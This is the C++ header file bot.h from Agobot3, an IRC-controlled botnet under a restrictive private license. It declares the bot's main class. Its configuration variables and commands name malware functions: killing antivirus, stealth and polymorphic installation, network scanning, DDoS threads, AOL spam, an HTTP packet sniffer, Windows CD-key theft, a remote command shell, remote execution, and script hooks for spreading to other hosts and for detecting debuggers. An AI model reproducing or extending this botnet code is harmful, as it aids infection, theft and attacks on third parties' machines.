/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __BOT_H__
#define __BOT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CBot : public CCommandHandler
{
public:
	CBot();
	bool Init();
	void Config();
	void Autostart();
	void Recv(CMessage *pMsg, bool bInternal=false);
	bool HandleMsg(CMessage *pMsg);
	bool HandleMsgInt(CMessage *pMsg);
	bool HandleFallBack(CMessage *pMsg);
	bool Think();

	CString SysInfo();
	CString LongUptime(int iDays);
	int UptimeDays();
	CString Status();

	void RunScript(unsigned long lEvent);

	bool m_bJoined;
	unsigned long m_lStartTime;

	cvar	si_nickprefix, si_servpass, si_server, si_port, si_chanpass, si_mainchan, si_nick, si_usessl,
			bot_version, bot_filename, bot_id, bot_prefix, bot_ftrans_port, bot_ftrans_port_ftp, bot_timeout,
			bot_seclogin, bot_compnick, bot_randnick, bot_meltserver, bot_topiccmd, bot_mutex_name,
			as_valname, as_enabled, as_service, as_service_name, do_speedtest,do_avkill,do_stealth,
			inst_polymorph,
			scan_maxthreads, scan_maxsockets,
			ddos_maxthreads,
			redir_maxthreads,
			spam_aol_channel, spam_aol_enabled,
			identd_enabled, cdkey_windows,
			sniffer_enabled, sniffer_channel, sniff_http, scaninfo_level,
			latency_sensitivity, latency_desired, 
			scaninfo_chan, bot_cmdshell, vuln_channel;

	bool HandleCommand(CMessage *pMsg);

	CommandInfo	m_cmdRemove, m_cmdStatus, m_cmdRndNick, m_cmdDie, m_cmdId, m_cmdAbout,
			m_cmdSysInfo, m_cmdLongUptime, m_cmdNick, m_cmdOpen, m_cmdDns, m_cmdRemoveAllBut,
			m_cmdExecute, m_cmdQuitBNC, m_cmdFlushDNS, m_cmdSecure, m_cmdUnSecure, m_cmdCommand,
			m_cmdHighSpeed;
	
	irc_server  m_isServerRoot, m_isServer0, m_isServer1, m_isServer2, m_isServer3, m_isServer4,
				m_isServer5, m_isServer6, m_isServer7;
};

#define SCRIPT_UNKNOWN		0	// Hmmmm....
#define SCRIPT_ONSTART		1	// Runs when the bot starts up
#define SCRIPT_ONCONNECT	2	// Runs when the bot connected to the server
#define SCRIPT_ONJOIN		3	// Runs when the bot joins the channel
#define SCRIPT_ONLOGIN		4	// Runs when someone logs into the bot
#define SCRIPT_ONDISCON		5	// Runs when the bot disconnects from the server
#define SCRIPT_ONREMOVE		6	// Runs when the bot is removed from the system
#define SCRIPT_ONSPREAD		7	// Runs when the bot spreads to another host
#define SCRIPT_ONDEBUG		8	// Runs when a debugger was attached to the process
#define SCRIPT_ONTIMER		9	// Runs after a specified
#define SCRIPT_ONSTARTUPFIN	10	// Runs after the startup thread finished

typedef struct scriptcmd_s {
	CString			sScriptCmd;
	unsigned long	lScriptType;
} scriptcmd;

extern list<scriptcmd> g_lScriptCmds;

#endif // __BOT_H__
